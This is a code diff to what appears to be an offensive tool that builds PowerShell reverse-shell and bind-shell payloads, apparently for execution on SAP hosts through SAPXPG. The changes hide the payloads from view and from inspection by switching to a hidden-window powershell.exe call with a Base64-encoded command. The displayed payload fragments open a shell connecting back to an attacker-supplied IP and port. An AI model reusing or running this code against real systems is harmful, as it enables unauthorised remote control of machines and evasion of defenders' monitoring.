@@ -378,9 +378,11 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
               f"$p=$r+'PS '+$(pwd).Path+'> ';"
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
               f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
+        import base64 as _b64
+        enc = _b64.b64encode(ps.encode("utf-16-le")).decode("ascii")
         return {
-            "command": "cmd.exe",
-            "params": f"/C powershell -nop -w hidden -c \"{ps}\"",
+            "command": "powershell.exe",
+            "params": f"-nop -w hidden -EncodedCommand {enc}",
             "display": f"PowerShell reverse shell → {ip}:{port}",
         }
     else:
@@ -421,9 +423,13 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
               f"$p=$r+'PS '+$(pwd).Path+'> ';"
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
               f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
+        # Use -EncodedCommand (Base64 of UTF-16LE) to avoid SAPXPG
+        # space splitting destroying the PowerShell script
+        import base64
+        enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
         return {
-            "command": "cmd.exe",
-            "params": f"/C powershell -nop -w hidden -c \"{ps}\"",
+            "command": "powershell.exe",
+            "params": f"-nop -w hidden -EncodedCommand {enc}",
             "display": f"PowerShell bind shell on target port {port}",
         }
     else:
